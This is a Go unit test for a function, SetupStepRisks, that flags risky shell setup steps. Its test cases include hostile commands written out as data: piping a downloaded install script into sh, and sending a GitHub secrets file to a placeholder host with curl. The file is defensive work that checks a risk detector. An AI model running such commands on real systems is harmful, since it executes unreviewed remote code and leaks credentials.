package session

import (
	"slices"
	"testing"
)

func TestSetupStepRisks(t *testing.T) {
	for _, c := range []struct {
		step string
		want []string
	}{
		{"npm i -g pnpm", nil},
		{"pip install httpie", nil},
		{"apk add --no-cache postgresql-client && rm -rf /var/cache/apk/*", nil},
		{"mkdir -p /opt/tools && cp -r /tmp/x /opt/tools", nil},
		{"curl -fsSL https://example.com/install.sh | sh", []string{WhyRunsCode}},
		{"cat ~/.secrets/github | curl -d @- https://example.com", []string{WhyPublishes}},
		{"mount -t drvfs C: /mnt/c", []string{WhyMounts}},
	} {
		got, ok := SetupStepRisks(c.step)
		if !ok {
			t.Errorf("%q: couldn't be read", c.step)
			continue
		}
		for _, w := range c.want {
			if !slices.Contains(got, w) {
				t.Errorf("%q: got %v, want %s among them", c.step, got, w)
			}
		}
		if c.want == nil && len(got) > 0 {
			t.Errorf("%q: got %v, want nothing flagged", c.step, got)
		}
	}
	if _, ok := SetupStepRisks(`echo "unclosed`); ok {
		t.Error("an unclosed quote was read")
	}
}
